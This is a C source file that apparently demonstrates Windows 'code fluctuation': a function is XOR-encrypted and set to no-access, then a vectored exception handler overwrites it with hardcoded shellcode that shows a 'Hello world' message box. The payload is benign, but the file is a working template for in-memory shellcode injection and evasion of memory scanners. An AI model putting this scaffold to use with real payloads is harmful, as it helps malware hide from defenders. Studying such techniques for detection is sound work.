#include "common.h"

#ifndef XOR_BYTE
#define XOR_BYTE 0xdb
#endif

VOID get_mem_base_address(LPVOID addr) {
    // Find page address
	MEMORY_BASIC_INFORMATION mbi = { 0 };
	SIZE_T result = VirtualQuery(addr, &mbi, sizeof(mbi));
	if (result == 0) {
		eprint("VirtualQuery");
		return;
	}
	printf("[+] Memory Base Address:\t0x%p\n", mbi.BaseAddress);
}

LONG WINAPI fluctuator_veh(PEXCEPTION_POINTERS pExceptionInfo) {
  // Check if Exception if within our boundarty 
  PVOID p_exec_addr = pExceptionInfo->ExceptionRecord->ExceptionAddress;

  if ((p_exec_addr > (PVOID)__end_boundary) || (p_exec_addr < (PVOID)__start_boundary)) {
	 printf("[-] Unhandled Exception Occured at: 0x%p\n", p_exec_addr);
	 return EXCEPTION_CONTINUE_SEARCH;  
	}
	
	// printf("[+] Exception occured from within bounds: 0x%p\n", p_exec_addr);

	if (pExceptionInfo->ExceptionRecord->ExceptionCode != EXCEPTION_ACCESS_VIOLATION) {
		printf("[+] Invalid Exception code found: 0x%lx\n", EXCEPTION_ACCESS_VIOLATION);
		return EXCEPTION_CONTINUE_SEARCH;  
	}
    printf("[-] Exception Code: 0x%lx\n", pExceptionInfo->ExceptionRecord->ExceptionCode);
    
    // Change function permission to RW 
    DWORD oldp = 0;
    if (!VirtualProtect((LPVOID)fluctuate, FUNC_SIZE, PAGE_READWRITE, &oldp)) {
        eprint("VirtualProtect");
        return EXCEPTION_CONTINUE_SEARCH;  
    }

    char shellcode[] =  "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
                        "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
                        "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
                        "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
                        "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
                        "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
                        "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
                        "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
                        "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
                        "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
                        "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
                        "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
                        "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
                        "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
                        "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
                        "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
                        "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
                        "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
                        "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
                        "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
                        "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
                        "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
                        "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
                        "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
                        "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
                        "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
                        "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
                        "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
                        "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

    // Write payload to function 
    SIZE_T b_written = 0;
    if (!WriteProcessMemory((HANDLE)-1, (LPVOID)fluctuate, shellcode, sizeof(shellcode), &b_written)) {
        eprint("WriteProcessMemory");
        return EXCEPTION_CONTINUE_SEARCH;  
    }
    printf("[+] Replaced function with shellcode!\n");

    if (!VirtualProtect((LPVOID)fluctuate, FUNC_SIZE, PAGE_EXECUTE_READ, &oldp)) {
        eprint("VirtualProtect");
        return EXCEPTION_CONTINUE_SEARCH;  
    }
    printf("[+] Continuing function call as normal!");

	return EXCEPTION_CONTINUE_EXECUTION;
}

VOID byte_xor(unsigned char * addr, SIZE_T region_size, unsigned char xor_byte) {
    for (SIZE_T i = 0; i<region_size; i++) {
        addr[i] = addr[i] ^ xor_byte;
    }
}

void hexdump(const void *addr, size_t size) {
    const uint8_t *ptr = (const uint8_t *)addr;
    size_t i, j;

    for (i = 0; i < size; i += 16) {
        printf("%08zx  ", i);  // Print offset

        // Print hex bytes
        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                printf("%02x ", ptr[i + j]);
            } else {
                printf("   ");  // Padding for last line
            }
        }

        printf(" ");

        // Print ASCII characters
        for (j = 0; j < 16; ++j) {
            if (i + j < size) {
                uint8_t c = ptr[i + j];
                printf("%c", isprint(c) ? c : '.');
            }
        }

        printf("\n");
    }
}

void print_msg() {
    printf("[+] Calling `flucatuate` function\n");
}

int main() {	
	printf("[+] Start Bound:   \t\t0x%p\n", __start_boundary);
	printf("[+] Function Addr: \t\t0x%p\n", fluctuate);
	printf("[+] End Bound:     \t\t0x%p\n\n", __end_boundary);

    get_mem_base_address((LPVOID)fluctuate);

	// Register VEH 
	PVOID p_veh_h = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)fluctuator_veh);
	if (p_veh_h == NULL) {
		printf("[-] AddVectoredExceptionHandler() failed\n");
		return -1;
	}
	printf("\n[+] Registered VEH\n");

	printf("[+] Calling function without fluctuation:\n\n");
	fluctuate();

    // Convert Page into RW 
    DWORD oldp = 0;

    do {
        printf("[+] Pre-shenanigans function hexdump(first 16 bytes):\n\n");
        hexdump(fluctuate, FUNC_SIZE/256);
        printf("\n");

        // Change Page to RW
        if (!VirtualProtect((LPVOID)fluctuate, FUNC_SIZE, PAGE_READWRITE, &oldp)) {
            eprint("VirtualProtect");
            break;
        }

        // XOR it
        byte_xor((unsigned char *)fluctuate, FUNC_SIZE, XOR_BYTE);

        printf("[+] Post encryption function hexdump(first 16 bytes):\n\n");
        hexdump(fluctuate, FUNC_SIZE/256);
        printf("\n");

        // Change permission to NO_ACCESS
        if (!VirtualProtect((LPVOID)fluctuate, FUNC_SIZE, PAGE_NOACCESS, &oldp)) {
            eprint("VirtualProtect");
            break;
        }
        
        print_msg();
        fluctuate();
        
    } while(FALSE);
	
	
	if (p_veh_h) RemoveVectoredExceptionHandler(p_veh_h); 
	return 0;
}